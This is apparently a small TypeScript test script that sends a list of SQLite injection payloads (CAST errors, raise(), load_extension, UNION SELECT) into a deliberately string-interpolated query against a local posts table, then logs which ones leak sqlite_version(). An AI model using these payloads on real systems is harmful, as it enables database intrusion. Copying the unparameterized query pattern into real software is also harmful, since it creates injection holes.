import { initDb } from '../config/db.js'
import { dbService } from '../services/dbService.js'

const db = await initDb()

const tests = [
  "1 AND CAST((SELECT sqlite_version()) AS INTEGER) --",
  "1 AND (SELECT 1 FROM (SELECT COUNT(*), sqlite_version() FROM posts GROUP BY 1)) --",
  "1 AND JSON_ARRAY_LENGTH((SELECT sqlite_version())) --",
  "1 AND abs((SELECT sqlite_version())) --",
  "1 AND typeof((SELECT sqlite_version())) = 'integer' --",
  "1 AND (SELECT sqlite_version()/0) --",
  "1 AND (SELECT 1/(CASE WHEN SUBSTR(sqlite_version(),1,1)='3' THEN 0 ELSE 1 END)) --",
  "1 AND load_extension((SELECT sqlite_version())) --",
  "1 AND (SELECT raise(abort, (SELECT sqlite_version()))) --",
  "1 AND (SELECT raise(rollback, 'SQLite ' || (SELECT sqlite_version()))) --",
  "1 AND (SELECT 1 WHERE (SELECT sqlite_version(), 1)) --",
  "1 AND (SELECT (SELECT sqlite_version(), 1)) --",
  "0 UNION SELECT sqlite_version(),2,3,4,5,6,7 --",
  "-1 UNION SELECT 1,2,3,4,5,6,7,8 --",
]

for (const id of tests) {
  const query = `SELECT * FROM posts WHERE id = ${id}`
  try {
    const row = await dbService.get(query)
    console.log('OK', id.slice(0, 60), '->', row ? 'row' : 'empty')
  } catch (e) {
    console.log('ERR', id.slice(0, 60))
    console.log('   ', (e as Error).message)
  }
}

await db.close()
